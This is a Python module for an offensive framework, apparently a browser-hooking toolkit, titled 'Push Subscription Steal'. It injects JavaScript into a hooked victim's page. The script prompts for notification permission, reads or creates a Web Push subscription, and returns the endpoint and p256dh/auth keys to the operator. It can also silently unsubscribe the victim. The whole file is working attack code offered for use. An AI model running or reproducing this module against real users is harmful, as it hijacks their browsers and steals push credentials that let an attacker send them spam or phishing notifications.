from kittysploit import *
import json


class Module(BrowserAuxiliary):

	__info__ = {
		"name": "Push Subscription Steal",
		"description": "Read or create a Web Push subscription (endpoint + keys) from the hooked origin",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}

	vapid_public_key = OptString(
		"",
		"VAPID applicationServerKey (base64url). Required to create a new subscription",
		False,
	)
	request_permission = OptBool(
		True,
		"Call Notification.requestPermission if needed before subscribe",
		False,
	)
	unsubscribe = OptBool(False, "Unsubscribe existing push subscription instead of reading/creating", False)

	@staticmethod
	def _url_base64_to_uint8_js():
		return """
			function urlBase64ToUint8Array(base64String) {
				const padding = '='.repeat((4 - (base64String.length % 4)) % 4);
				const base64 = (base64String + padding).replace(/-/g, '+').replace(/_/g, '/');
				const raw = atob(base64);
				const out = new Uint8Array(raw.length);
				for (let i = 0; i < raw.length; i++) out[i] = raw.charCodeAt(i);
				return out;
			}
			function abToB64(buf) {
				const bytes = new Uint8Array(buf);
				let s = '';
				for (let i = 0; i < bytes.length; i++) s += String.fromCharCode(bytes[i]);
				return btoa(s);
			}
			function serializeSub(sub) {
				if (!sub) return null;
				const json = sub.toJSON ? sub.toJSON() : {};
				return {
					endpoint: sub.endpoint || json.endpoint || null,
					expirationTime: sub.expirationTime || null,
					keys: json.keys || null,
					p256dh_b64: (sub.getKey && sub.getKey('p256dh')) ? abToB64(sub.getKey('p256dh')) : (json.keys && json.keys.p256dh) || null,
					auth_b64: (sub.getKey && sub.getKey('auth')) ? abToB64(sub.getKey('auth')) : (json.keys && json.keys.auth) || null
				};
			}
		"""

	def run(self):
		vapid = str(self.vapid_public_key or "").strip()
		req_perm = self._to_bool(self.request_permission)
		unsub = self._to_bool(self.unsubscribe)
		helpers = self._url_base64_to_uint8_js()

		code_js = f"""
		(function() {{
			{helpers}
			const VAPID = {json.dumps(vapid)};
			const REQ_PERM = {str(req_perm).lower()};
			const UNSUB = {str(unsub).lower()};

			const out = {{
				ok: false,
				supported: false,
				secure_context: !!window.isSecureContext,
				origin: location.origin,
				page_url: location.href,
				notification_permission: (typeof Notification !== 'undefined') ? Notification.permission : 'unsupported',
				subscription: null,
				error: null
			}};

			if (!('serviceWorker' in navigator) || !('PushManager' in window)) {{
				out.error = 'PushManager / serviceWorker unavailable';
				return Promise.resolve(JSON.stringify(out));
			}}
			out.supported = true;

			function ensurePermission() {{
				if (!REQ_PERM || typeof Notification === 'undefined') {{
					return Promise.resolve(out.notification_permission);
				}}
				if (Notification.permission === 'granted' || Notification.permission === 'denied') {{
					return Promise.resolve(Notification.permission);
				}}
				return Notification.requestPermission().then(function(p) {{
					out.notification_permission = p;
					return p;
				}});
			}}

			return navigator.serviceWorker.getRegistration().then(function(reg) {{
				const ready = reg ? Promise.resolve(reg) : navigator.serviceWorker.ready.catch(function() {{ return null; }});
				return ready.then(function(registration) {{
					if (!registration || !registration.pushManager) {{
						out.error = 'No service worker registration with pushManager (register a SW first)';
						return JSON.stringify(out);
					}}
					return ensurePermission().then(function(perm) {{
						return registration.pushManager.getSubscription().then(function(existing) {{
							if (UNSUB) {{
								if (!existing) {{
									out.ok = true;
									out.error = null;
									out.note = 'No existing subscription to remove';
									return JSON.stringify(out);
								}}
								return existing.unsubscribe().then(function(ok) {{
									out.ok = !!ok;
									out.unsubscribed = !!ok;
									out.subscription = serializeSub(existing);
									return JSON.stringify(out);
								}});
							}}

							if (existing) {{
								out.ok = true;
								out.subscription = serializeSub(existing);
								out.source = 'existing';
								return JSON.stringify(out);
							}}

							if (!VAPID) {{
								out.error = 'No existing subscription and vapid_public_key not set';
								return JSON.stringify(out);
							}}
							if (perm === 'denied') {{
								out.error = 'Notification permission denied';
								return JSON.stringify(out);
							}}

							return registration.pushManager.subscribe({{
								userVisibleOnly: true,
								applicationServerKey: urlBase64ToUint8Array(VAPID)
							}}).then(function(sub) {{
								out.ok = true;
								out.source = 'created';
								out.subscription = serializeSub(sub);
								return JSON.stringify(out);
							}});
						}});
					}});
				}});
			}}).catch(function(err) {{
				out.error = err.message || String(err);
				return JSON.stringify(out);
			}});
		}})();
		"""

		result = self.send_js_and_wait_for_response(code_js, timeout=25.0)
		if not result:
			print_error("Failed to run push subscription steal")
			return False
		if isinstance(result, str) and result.startswith("Error:"):
			print_error(result)
			return False

		try:
			data = json.loads(result)
		except json.JSONDecodeError as exc:
			print_error(f"Failed to parse response: {exc}")
			return False

		print_info("=" * 60)
		print_info("Push Subscription")
		print_info(f"  Origin: {data.get('origin')}")
		print_info(f"  Secure context: {data.get('secure_context')}")
		print_info(f"  Notification permission: {data.get('notification_permission')}")

		if data.get("unsubscribed"):
			print_success("Unsubscribed existing push subscription")
			return True

		if not data.get("ok"):
			print_error(data.get("error") or "Push subscription unavailable")
			if "service worker" in str(data.get("error") or "").lower():
				print_info("Tip: run browser_auxiliary/misc/service_worker_register first")
			return False

		sub = data.get("subscription") or {}
		print_success(f"Subscription ({data.get('source', 'unknown')})")
		print_warning(f"  endpoint: {sub.get('endpoint')}")
		if sub.get("keys"):
			print_info(f"  keys: {json.dumps(sub.get('keys'))}")
		else:
			print_info(f"  p256dh: {sub.get('p256dh_b64')}")
			print_info(f"  auth: {sub.get('auth_b64')}")
		return True
